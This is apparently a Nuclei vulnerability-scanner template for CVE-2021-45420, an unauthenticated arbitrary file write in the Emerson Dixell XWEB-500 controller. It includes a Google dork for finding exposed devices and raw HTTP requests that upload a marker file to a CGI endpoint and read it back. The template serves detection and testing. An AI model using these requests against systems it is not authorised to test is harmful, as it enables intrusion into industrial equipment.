id: CVE-2021-45420

info:
  name: Emerson Dixell XWEB-500 - Arbitrary File Write
  author: hackerarpan
  severity: critical
  description: |
    Emerson Dixell XWEB-500 contains an arbitrary file write caused by unauthenticated access to /cgi-bin/logo_extra_upload.cgi, /cgi-bin/cal_save.cgi, and /cgi-bin/lo_utils.cgi, letting attackers write any file on the system, exploit requires no authentication.
  reference:
    - https://www.exploit-db.com/exploits/50639
    - https://www.swascan.com/emerson
    - https://nvd.nist.gov/vuln/detail/CVE-2021-45420
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-45420
    cwe-id: CWE-200
    epss-score: 0.78704
    epss-percentile: 0.99001
    cpe: cpe:2.3:h:emerson:dixell_xweb-500:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: emerson
    product: dixell_xweb-500
    google-query: inurl:"xweb500.cgi"
  tags: cve,cve2021,lfw,iot,dixell,xweb500,edb,fileupload,intrusive,vkev

http:
  - raw:
      - |
        POST /cgi-bin/logo_extra_upload.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/octet-stream

        {{randstr}}.txt
        dixell-xweb500-filewrite
      - |
        GET /logo/{{randstr}}.txt HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, "dixell-xweb500-filewrite")'

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100f026c3e5688c9d8c6e1929aedca56d6e1f1024967b9064e52e6b02d1f5ac9fa502210096c1f91be2cdc353237379bdc569a027bf8c013139159fcc2556d2788d968ea7:922c64590222798bb761d5b6d8e72950